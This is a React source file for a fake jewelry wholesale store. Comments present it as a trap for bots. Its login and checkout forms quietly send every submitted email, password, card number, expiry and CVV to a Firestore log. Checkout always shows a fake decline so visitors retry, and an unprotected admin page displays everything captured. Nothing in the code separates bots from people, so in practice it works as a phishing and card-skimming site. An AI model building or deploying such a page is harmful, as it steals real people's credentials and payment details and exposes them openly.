import React, { useState, useEffect } from 'react';
import { BrowserRouter as Router, Routes, Route, useNavigate } from 'react-router-dom';
import { collection, addDoc, serverTimestamp, query, orderBy, onSnapshot } from 'firebase/firestore';
import { db } from './firebase';
import { Lock, ChevronRight, Gem, Terminal } from 'lucide-react';

// --- LIVE ADMIN DASHBOARD COMPONENT ---
const AdminDashboard = () => {
  const [logs, setLogs] = useState([]);
  const [loading, setLoading] = useState(true);

  useEffect(() => {
    // Listen for Firestore updates in real time
    const q = query(collection(db, 'threat_logs'), orderBy('timestamp', 'desc'));
    const unsubscribe = onSnapshot(q, (snapshot) => {
      const liveLogs = snapshot.docs.map((doc) => ({
        id: doc.id,
        ...doc.data()
      }));
      setLogs(liveLogs);
      setLoading(false);
    });

    return () => unsubscribe();
  }, []);

  const getBadgeColor = (type) => {
    switch (type) {
      case 'LOGIN_ATTEMPT': return 'bg-amber-500/10 text-amber-400 border-amber-500/30';
      case 'CARD_TEST': return 'bg-red-500/10 text-red-400 border-red-500/30';
      default: return 'bg-slate-800 text-slate-300 border-slate-700';
    }
  };

  return (
    <div className="max-w-7xl mx-auto px-4 py-8">
      <div className="flex items-center justify-between mb-8 border-b border-slate-800 pb-4">
        <div className="flex items-center space-x-3">
          <Terminal className="w-6 h-6 text-gold-500" />
          <h2 className="text-xl font-serif text-white tracking-wide">Threat Intelligence Feed</h2>
        </div>
        <div className="flex items-center space-x-2 text-xs text-emerald-400 bg-emerald-950/50 border border-emerald-500/30 px-3 py-1.5 rounded-full">
          <span className="w-2 h-2 rounded-full bg-emerald-400 animate-pulse"></span>
          <span>Real-time Socket Connected</span>
        </div>
      </div>

      {loading ? (
        <div className="text-center py-12 text-slate-500">Connecting to telemetry feed...</div>
      ) : logs.length === 0 ? (
        <div className="text-center py-12 text-slate-500 border border-dashed border-slate-800 rounded-xl">
          No threat events captured yet. Waiting for incoming traffic...
        </div>
      ) : (
        <div className="space-y-4">
          {logs.map((log) => (
            <div key={log.id} className="bg-slate-900 border border-slate-800 rounded-lg p-5 transition-all hover:border-slate-700">
              <div className="flex flex-wrap items-center justify-between gap-4 mb-3">
                <span className={`text-xs font-mono px-2.5 py-1 rounded border uppercase font-medium ${getBadgeColor(log.eventType)}`}>
                  {log.eventType}
                </span>
                <span className="text-xs font-sans text-slate-500">
                  {log.timestamp?.toDate ? log.timestamp.toDate().toLocaleString() : 'Just now'}
                </span>
              </div>

              {/* Payload Data Display */}
              <div className="bg-slate-950 border border-slate-800/80 rounded p-4 mb-3 font-mono text-sm text-slate-300 overflow-x-auto">
                <pre>{JSON.stringify(log.payload, null, 2)}</pre>
              </div>

              <div className="text-xs font-sans text-slate-500 truncate">
                <span className="text-slate-400 font-medium">User Agent:</span> {log.userAgent}
              </div>
            </div>
          ))}
        </div>
      )}
    </div>
  );
};

const logThreatEvent = async (eventType, payload) => {
  try {
    await addDoc(collection(db, 'threat_logs'), {
      eventType,
      userAgent: navigator.userAgent,
      timestamp: serverTimestamp(),
      payload
    });
  } catch (err) {
    // Fail silently so the bot doesn't know it's a trap
  }
};

// --- COMPONENTS ---

const Header = () => (
  <header className="w-full border-b border-slate-800/50 bg-slate-950/80 backdrop-blur-md p-6 flex justify-center items-center sticky top-0 z-50">
    <Gem className="text-gold-500 w-6 h-6 mr-3" />
    <h1 className="text-2xl font-serif text-white tracking-widest uppercase">Justine Jewelries</h1>
  </header>
);

const Login = () => {
  const navigate = useNavigate();
  const handleSubmit = (e) => {
    e.preventDefault();
    const formData = new FormData(e.target);
    logThreatEvent('LOGIN_ATTEMPT', Object.fromEntries(formData));
    navigate('/catalog');
  };

  return (
    <div className="min-h-screen flex flex-col items-center justify-center p-4">
      <div className="max-w-md w-full bg-slate-900 border border-slate-800 rounded-xl p-8 shadow-2xl">
        <div className="text-center mb-8">
          <h2 className="text-2xl font-serif text-white mb-2">Wholesale Portal</h2>
          <p className="text-sm text-slate-400 font-sans">Authorized partners only.</p>
        </div>
        <form onSubmit={handleSubmit} className="space-y-6">
          <div>
            <label className="block text-xs font-sans text-slate-400 uppercase tracking-wider mb-2">Email Address</label>
            <input type="email" name="email" required className="w-full bg-slate-950 border border-slate-800 text-white px-4 py-3 rounded focus:outline-none focus:border-gold-500 transition-colors font-sans" />
          </div>
          <div>
            <label className="block text-xs font-sans text-slate-400 uppercase tracking-wider mb-2">Password</label>
            <input type="password" name="password" required className="w-full bg-slate-950 border border-slate-800 text-white px-4 py-3 rounded focus:outline-none focus:border-gold-500 transition-colors font-sans" />
          </div>
          <button type="submit" className="w-full bg-gold-600 hover:bg-gold-500 text-white font-sans font-medium py-3 rounded flex justify-center items-center transition-colors">
            <Lock className="w-4 h-4 mr-2" /> Secure Login
          </button>
        </form>
      </div>
    </div>
  );
};

const Catalog = () => {
  const navigate = useNavigate();
  const products = [
    { 
      id: 1, 
      name: "18K Gold Cuban Link", 
      price: "$4,500",
      image: "https://images.unsplash.com/photo-1599643478518-a784e5dc4c8f?auto=format&fit=crop&w=800&q=80"
    },
    { 
      id: 2, 
      name: "5CT Diamond Solitaire", 
      price: "$12,200",
      image: "https://images.unsplash.com/photo-1605100804763-247f67b3557e?auto=format&fit=crop&w=800&q=80"
    },
    { 
      id: 3, 
      name: "Sapphire Tennis Bracelet", 
      price: "$8,900",
      image: "https://images.unsplash.com/photo-1535632066927-ab7c9ab60908?auto=format&fit=crop&w=800&q=80"
    }
  ];

  return (
    <div className="max-w-6xl mx-auto px-4 py-12">
      <h2 className="text-3xl font-serif text-white mb-2">Exclusive Collection</h2>
      <p className="text-slate-400 font-sans mb-12">Current wholesale rates. Subject to market availability.</p>
      <div className="grid md:grid-cols-3 gap-8">
        {products.map(p => (
          <div key={p.id} className="bg-slate-900 border border-slate-800 rounded-xl overflow-hidden group hover:border-gold-500 transition-all duration-300 shadow-xl">
            <div className="h-64 bg-slate-950 overflow-hidden relative">
              <img 
                src={p.image} 
                alt={p.name} 
                className="w-full h-full object-cover group-hover:scale-105 transition-transform duration-500 opacity-90 group-hover:opacity-100"
              />
              <div className="absolute inset-0 bg-gradient-to-t from-slate-900 via-transparent to-transparent opacity-40"></div>
            </div>
            <div className="p-6">
              <h3 className="text-lg font-serif text-white mb-2">{p.name}</h3>
              <p className="text-gold-400 font-sans font-medium mb-6">{p.price}</p>
              <button onClick={() => navigate('/checkout')} className="w-full flex items-center justify-between text-sm font-sans text-white border border-slate-700 hover:border-gold-500 py-2 px-4 rounded transition-colors bg-slate-950/50 hover:bg-slate-800">
                Order Now <ChevronRight className="w-4 h-4" />
              </button>
            </div>
          </div>
        ))}
      </div>
    </div>
  );
};

const Checkout = () => {
  const [error, setError] = useState(false);
  const handleSubmit = (e) => {
    e.preventDefault();
    const formData = new FormData(e.target);
    logThreatEvent('CARD_TEST', Object.fromEntries(formData));
    setError(true); // Always fail to trap bots in a loop
    e.target.reset();
  };

  return (
    <div className="max-w-2xl mx-auto px-4 py-12">
      <div className="bg-slate-900 border border-slate-800 rounded-xl p-8">
        <h2 className="text-2xl font-serif text-white mb-6">Secure Checkout</h2>
        {error && (
          <div className="bg-red-950/50 border border-red-500/50 text-red-400 px-4 py-3 rounded mb-6 font-sans text-sm">
            Payment Declined: Card Issuer Error. Please try a different payment method.
          </div>
        )}
        <form onSubmit={handleSubmit} className="space-y-6">
          <div className="grid md:grid-cols-2 gap-6">
            <div>
              <label className="block text-xs font-sans text-slate-400 uppercase mb-2">Cardholder Name</label>
              <input type="text" name="name" required className="w-full bg-slate-950 border border-slate-800 text-white px-4 py-3 rounded focus:outline-none focus:border-gold-500 font-sans" />
            </div>
            <div>
              <label className="block text-xs font-sans text-slate-400 uppercase mb-2">Card Number</label>
              <input type="text" name="ccNumber" maxLength="16" required className="w-full bg-slate-950 border border-slate-800 text-white px-4 py-3 rounded focus:outline-none focus:border-gold-500 font-sans" />
            </div>
            <div>
              <label className="block text-xs font-sans text-slate-400 uppercase mb-2">Expiry (MM/YY)</label>
              <input type="text" name="expiry" maxLength="5" required className="w-full bg-slate-950 border border-slate-800 text-white px-4 py-3 rounded focus:outline-none focus:border-gold-500 font-sans" />
            </div>
            <div>
              <label className="block text-xs font-sans text-slate-400 uppercase mb-2">CVV</label>
              <input type="text" name="cvv" maxLength="4" required className="w-full bg-slate-950 border border-slate-800 text-white px-4 py-3 rounded focus:outline-none focus:border-gold-500 font-sans" />
            </div>
          </div>
          <button type="submit" className="w-full bg-gold-600 hover:bg-gold-500 text-white font-sans font-medium py-4 rounded transition-colors">
            Process Payment
          </button>
        </form>
      </div>
    </div>
  );
};

// --- APP ROUTER ---
export default function App() {
  return (
    <Router>
      <div className="min-h-screen bg-slate-950 flex flex-col">
        <Header />
        <div className="flex-grow">
          <Routes>
            <Route path="/" element={<Login />} />
            <Route path="/catalog" element={<Catalog />} />
            <Route path="/checkout" element={<Checkout />} />
            {/* Secret Real-time Threat Monitor */}
            <Route path="/admin" element={<AdminDashboard />} />
          </Routes>
        </div>
      </div>
    </Router>
  );
}
